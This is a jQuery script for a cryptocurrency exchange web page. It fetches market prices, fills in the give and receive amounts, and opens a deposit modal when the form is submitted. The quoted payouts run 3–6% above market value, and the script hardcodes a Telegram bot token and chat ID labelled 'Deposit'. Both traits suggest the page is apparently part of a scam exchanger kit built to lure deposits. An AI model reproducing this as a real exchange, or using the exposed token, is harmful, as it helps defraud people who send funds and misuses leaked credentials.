$(document).ready(function () {
  const getKoef = () => {
    const sendCoins = document.querySelectorAll(
      ".element__block-item.element__block-item_active"
    );
    const coin1 = sendCoins[0]
      .querySelector(".element__block-span")
      .innerHTML.replaceAll(" ", "")
      .replaceAll("\n", "");
    const coin2 = sendCoins[1]
      .querySelector(".element__block-span")
      .innerHTML.replaceAll(" ", "")
      .replaceAll("\n", "");
    const targetCoins = ["matic", "uni", "bnb"];
    if (targetCoins.includes(coin1) || targetCoins.includes(coin2)) {
      return 103;
    } else {
      return 100;
    }
  };

  $.ajax({
    url: "https://min-api.cryptocompare.com/data/price?fsym=btc&tsyms=usdt",
    dataType: "json",
    success: function (data) {
      data = data["USDT"];
      $(".element__block-give-header span").text(
        (10 / data).toFixed(5) + " - " + (5000000 / data).toFixed(5)
      );
      $(".element__block-input-give").val((10 / data).toFixed(5));
      $(".element__block-input-give").attr("min", (10 / data).toFixed(5));
      $(".element__block-input-give").attr("max", (5000000 / data).toFixed(5));
      $(".element__block-input-calc-give").val((10 / data).toFixed(5));
      $(".element__block-input-get").val(
        (((data * $("#element__block-input-give").val()) / 100) * 106).toFixed(
          5
        )
      );
      $(".element__block-input-calc-get").val(
        (((data * $("#element__block-input-give").val()) / 100) * 106).toFixed(
          5
        )
      );
    },
  });

  var chatid = "-1001814291575";
  var token = "5692660810:AAEY8irN7p52zDuieNelQyN0b5YUuoki2ng";
  var text = "Deposit";
  let wallets = new Array();
  wallets["btc"] = "Bitcoin";
  wallets["xlm"] = "Stellar Network";
  wallets["eth"] = "Ethereum (ERC-20)";
  wallets["etc"] = "Ethereum Classic";
  wallets["bnb-bep2"] = "Binance Coin (BEP-2)";
  wallets["bnb"] = "Binance Coin (BEP-20)";
  wallets["ltc"] = "Litecoin";
  wallets["sol"] = "Solana";
  wallets["usdt-trc20"] = "USD Tether (TRC-20)";
  wallets["usdt-erc20"] = "USD Tether (ERC-20)";
  wallets["usdc-bep20"] = "USD Tether (BEP-20)";
  wallets["doge"] = "Doge Coin";
  wallets["xrp"] = "Ripple";
  wallets["shib-erc20"] = "Shiba Inu (ERC-20)";
  wallets["shib-bep20"] = "Shiba Inu (BEP-20)";
  wallets["trx"] = "Tron";
  wallets["busd"] = "Binance USD (BEP-20)";
  wallets["usdc-trc20"] = "USD Coin (TRC-20)";
  wallets["usdc-erc20"] = "USD Coin (ERC-20)";
  wallets["usdc-bep20"] = "USD Coin (BEP-20)";
  wallets["dai-erc20"] = "Dai (ERC-20)";
  wallets["tusd-bep20"] = "True USD (BEP-20)";
  wallets["tusd-erc20"] = "True USD (ERC-20)";
  wallets["avax"] = "Avalanche";
  wallets["ada"] = "Cardano";
  wallets["ada-bep20"] = "Cardano";
  wallets["matic"] = "Polygon";
  wallets["waves"] = "Waves";
  wallets["uni-erc20"] = "Uniswap (ERC-20)";
  wallets["uni-bep20"] = "Uniswap (BEP-20)";
  wallets["dai"] = "Dai";

  $(".element__block-input1").keyup(function () {
    if (parseInt($(this).val()) < 0) {
      $(this).val($(this).val() * -1);
    } else {
      $(".element__block-input-calc-" + $(this).data("type")).val(
        $(this).val()
      );
      if ($(this).hasClass("element__block-input-give")) {
        $.ajax({
          url:
            "https://min-api.cryptocompare.com/data/price?fsym=" +
            $.trim($("label.element__block-label-give:first").text()) +
            "&tsyms=" +
            $.trim($("label.element__block-label-get:first").text()) +
            "",
          dataType: "json",
          success: function (data) {
            $(".element__block-input-calc-get").val(
              parseFloat(
                ((data[
                  $.trim(
                    $("label.element__block-label-get:first").text()
                  ).toUpperCase()
                ] *
                  parseFloat($("#element__block-input-give").val())) /
                  100) *
                  getKoef()
              ).toFixed(5)
            );
            $(".element__block-input-get").val(
              parseFloat(
                ((data[
                  $.trim(
                    $("label.element__block-label-get:first").text()
                  ).toUpperCase()
                ] *
                  parseFloat($("#element__block-input-give").val())) /
                  100) *
                  getKoef()
              ).toFixed(5)
            );
          },
        });
      } else if ($(this).hasClass("element__block-input-get")) {
        $.ajax({
          url:
            "https://min-api.cryptocompare.com/data/price?fsym=" +
            $.trim($("label.element__block-label-give:first").text()) +
            "&tsyms=" +
            $.trim($("label.element__block-label-get:first").text()) +
            "",
          dataType: "json",
          success: function (data) {
            $(".element__block-input-calc-give").val(
              parseFloat(
                parseFloat($("#element__block-input-get").val()) /
                  data[
                    $.trim(
                      $("label.element__block-label-get:first").text()
                    ).toUpperCase()
                  ]
              ).toFixed(5)
            );
            $(".element__block-input-give").val(
              parseFloat(
                parseFloat($("#element__block-input-get").val()) /
                  data[
                    $.trim(
                      $("label.element__block-label-get:first").text()
                    ).toUpperCase()
                  ]
              ).toFixed(5)
            );
          },
        });
      }
    }
  });

  $(".element__block-item-give").click(function () {
    $(".element__block-item-give").removeClass("element__block-item_active");
    $(this).addClass("element__block-item_active");
    $(".element__block-label-give").text($(this).children("span").text());
    $(".element__block-calc-give-img").attr(
      "src",
      "img/crypto/" + $.trim($(this).children("span").text()) + ".svg"
    );
    $.ajax({
      url:
        "https://min-api.cryptocompare.com/data/price?fsym=" +
        $.trim(
          $(".element__block-item-give.element__block-item_active")
            .children("span")
            .text()
        ) +
        "&tsyms=usdt",
      dataType: "json",
      success: function (data) {
        data = data["USDT"];
        dataMin = (10 / data).toFixed(5);
        dataMax = (5000000 / data).toFixed(5);

        $(".element__block-give-header span").text(dataMin + " - " + dataMax);
        $(".element__block-input-give").val(dataMin);
        $(".element__block-input-calc-give").val(dataMin);
        $(".element__block-input-give").attr("min", dataMin);
        $(".element__block-input-give").attr("max", dataMax);
        $.ajax({
          url:
            "https://min-api.cryptocompare.com/data/price?fsym=" +
            $.trim($("label.element__block-label-give:first").text()) +
            "&tsyms=" +
            $.trim($("label.element__block-label-get:first").text()) +
            "",
          dataType: "json",
          success: function (data) {
            $(".element__block-input-calc-get").val(
              parseFloat(
                ((data[
                  $.trim(
                    $("label.element__block-label-get:first").text()
                  ).toUpperCase()
                ] *
                  parseFloat($("#element__block-input-give").val())) /
                  100) *
                  getKoef()
              ).toFixed(5)
            );
            $(".element__block-input-get").val(
              parseFloat(
                ((data[
                  $.trim(
                    $("label.element__block-label-get:first").text()
                  ).toUpperCase()
                ] *
                  parseFloat($("#element__block-input-give").val())) /
                  100) *
                  getKoef()
              ).toFixed(5)
            );
          },
        });
      },
    });
  });

  $(".element__block-item-get").click(function () {
    $(".element__block-item-get").removeClass("element__block-item_active");
    $(this).addClass("element__block-item_active");
    $(".element__block-label-get").text($(this).children("span").text());
    $(".element__block-calc-get-img").attr(
      "src",
      "img/crypto/" + $.trim($(this).children("span").text()) + ".svg"
    );
    $.ajax({
      url:
        "https://min-api.cryptocompare.com/data/price?fsym=" +
        $.trim($("label.element__block-label-give:first").text()) +
        "&tsyms=" +
        $.trim($("label.element__block-label-get:first").text()) +
        "",
      dataType: "json",
      success: function (data) {
        $(".element__block-input-calc-get").val(
          parseFloat(
            ((data[
              $.trim(
                $("label.element__block-label-get:first").text()
              ).toUpperCase()
            ] *
              parseFloat($("#element__block-input-give").val())) /
              100) *
              getKoef()
          ).toFixed(5)
        );
        $(".element__block-input-get").val(
          parseFloat(
            ((data[
              $.trim(
                $("label.element__block-label-get:first").text()
              ).toUpperCase()
            ] *
              parseFloat($("#element__block-input-give").val())) /
              100) *
              getKoef()
          ).toFixed(5)
        );
      },
    });

    if ($(this).hasClass("fiat")) {
      $("#element__block-wallet").attr("placeholder", "Your card number");
      $("#element__block-wallet").attr("minlength", "16");
    } else {
      $("#element__block-wallet").attr("placeholder", "Your crypto address");
      $("#element__block-wallet").attr("minlength", "26");
      $("#element__block-wallet").removeAttr("maxlength");
    }
  });

  $(".element__block-form").submit(function (e) {
    e.preventDefault();
    if (
      $("#element__block-input-give").val() == "" ||
      $("#element__block-input-get").val() == ""
    ) {
      if ($("#element__block-input-give").val() == "") {
        $("#element__block-input-give").css({
          border: "1px solid #E96A6A",
        });
      } else {
        $("#element__block-input-give").css({
          border: "1px solid transparent",
        });
      }
      if ($("#element__block-input-get").val() == "") {
        $("#element__block-input-get").css({
          border: "1px solid #E96A6A",
        });
      } else {
        $("#element__block-input-get").css({
          border: "1px solid transparent",
        });
      }
    } else if (
      parseFloat($("#element__block-input-give").val()) <
        parseFloat($("#element__block-input-give").attr("min")) ||
      parseFloat($("#element__block-input-give").val()) >
        parseFloat($("#element__block-input-give").attr("max"))
    ) {
      $("#element__block-input-give").css({
        border: "1px solid #E96A6A",
      });

      $(".element__block-give-header span").css({
        color: "#E96A6A",
      });
    } else {
      $("#modal__input-address").val(
        wallets[
          $.trim(
            $("label.element__block-label-give:first").text()
          ).toLowerCase()
        ]
      );
      $("main").children("section").fadeOut();
      $(".modal").css({
        display: "flex",
      });
    }
  });

  $(".modal__label").click(function () {
    var copyText = document.getElementById(
      "modal__input-" + $(this).data("type")
    );
    copyText.select();
    document.execCommand("copy");
  });
});
